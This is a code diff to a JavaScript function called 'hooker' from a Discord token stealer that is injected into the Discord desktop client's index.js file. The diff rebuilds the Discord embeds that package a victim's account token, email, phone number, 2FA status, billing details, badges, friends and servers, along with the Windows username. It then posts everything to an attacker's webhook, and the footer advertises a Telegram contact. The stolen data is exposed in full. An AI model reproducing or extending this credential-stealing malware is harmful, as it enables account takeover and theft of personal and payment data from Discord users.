@@ -162,55 +162,87 @@ const hooker = async (content, token, account) => {
         ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=4096`
         : `https://cdn.discordapp.com/embed/avatars/0.png`;
 
+    content["embeds"][0]["author"] = {
+        "name": account.username,
+        "icon_url": avatarUrl
+    };
+    content["embeds"][0]["thumbnail"] = {
+        "url": avatarUrl
+    };
+    content["embeds"][0]["footer"] = {
+        "text": `${os.userInfo().username} | https://t.me/hairo13x7`,
+        "icon_url": "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&",
+    };
+    content["embeds"][0]["title"] = "Account Information";
+
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
     const billing = await getBilling(token);
+
     const friends = await getFriends(token);
     const servers = await getServers(token);
 
-    // Ana embed'i güncelle - orijinal field'ları koru ve ek bilgiler ekle
-    content["embeds"][0]["footer"] = { 
-        text: `${os.userInfo().username} | https://t.me/hairo13x7`, 
-        icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" 
-    };
-    
-    // Orijinal field'ları koru ve ek bilgiler ekle
+    // Orijinal field'ları koru ve ek field'ları ekle
     const originalFields = content["embeds"][0]["fields"] || [];
     const additionalFields = [
-        { name: `<:mastercard_spacex:1429086506781511771> Token:`, value: `\`\`\`${token}\`\`\``, inline: false },
-        { name: `<:badges_spacex:1429086523906850906> Badges:`, value: badges || "`No Badges`", inline: true },
-        { name: `<:mastercard_spacex:1429086506781511771> Billing:`, value: billing, inline: true },
-        { name: `<a:money_spacex:1429086508505239623> 2FA:`, value: `\`${account.mfa_enabled ? "Yes" : "No"}\``, inline: true },
-        { name: `<:email_spacex:1429086532811358350> Email:`, value: `\`${account.email}\``, inline: true },
-        { name: `<a:billing_postal:1429086529300598895> Phone:`, value: `\`${account.phone || "None"}\``, inline: true },
+        {
+            "name": `<:mastercard_spacex:1429086506781511771> Token:`,
+            "value": "```" + token + "```",
+            "inline": false
+        }, {
+            "name": `<:nitro_spacex:1429086514893164647> Nitro:`,
+            "value": nitro,
+            "inline": true
+        }, {
+            "name": `<:badges_spacex:1429086523906850906> Badges:`,
+            "value": badges,
+            "inline": true
+        }, {
+            "name": `<:mastercard_spacex:1429086506781511771> Billing:`,
+            "value": billing,
+            "inline": true
+        }, {
+            "name": `<a:money_spacex:1429086508505239623> 2FA:`,
+            "value": `\`${account.mfa_enabled ? "Yes" : "No"}\``,
+            "inline": true
+        }, {
+            "name": `<:email_spacex:1429086532811358350> Email:`,
+            "value": `\`${account.email}\``,
+            "inline": true
+        }, {
+            "name": `<a:billing_postal:1429086529300598895> Phone:`,
+            "value": `\`${account.phone || "None"}\``,
+            "inline": true
+        }, {
+            "name": `<:space_classic:1429086519901032610> Path:`,
+            "value": `\`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js\``,
+            "inline": false
+        }
     ];
-    
-    // Injection path'i ekle
-    const pathToShow = `C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
-    additionalFields.push({ name: `<:space_classic:1429086519901032610> Path:`, value: `\`${pathToShow}\``, inline: false });
-    
-    // Orijinal field'ları koru ve ek field'ları ekle
+
     if (originalFields.length > 0) {
         content["embeds"][0]["fields"] = [...originalFields, ...additionalFields];
     } else {
         content["embeds"][0]["fields"] = additionalFields;
     }
-    content["embeds"][0]["color"] = 0x313338;
-    content["embeds"][0]["author"] = { name: account.username, icon_url: avatarUrl };
-    content["embeds"][0]["thumbnail"] = { url: avatarUrl };
 
-    // HQ Friends embed'i ekle
     content["embeds"].push({
-        color: 0x313338,
-        description: friends.message,
-        author: { name: `HQ Friends (${friends.totalFriends})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
-        footer: { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+        "title": `HQ Friends (${friends.totalFriends})`,
+        "description": friends.message,
+        "color": 0x313338,
+        "author": { name: `HQ Friends (${friends.totalFriends})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+        "footer": { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
     }, {
-        color: 0x313338,
-        description: servers.message,
-        author: { name: `Rare Servers (${servers.totalGuilds})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
-        footer: { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+        "title": `Rare Servers (${servers.totalGuilds})`,
+        "description": servers.message,
+        "color": 0x313338,
+        "author": { name: `Rare Servers (${servers.totalGuilds})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
+        "footer": { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
     });
+
+    for (const embed in content["embeds"]) {
+        content["embeds"][embed]["color"] = 0x313338;
+    }
 
     await request("POST", CONFIG.webhook, {
         "Content-Type": "application/json"
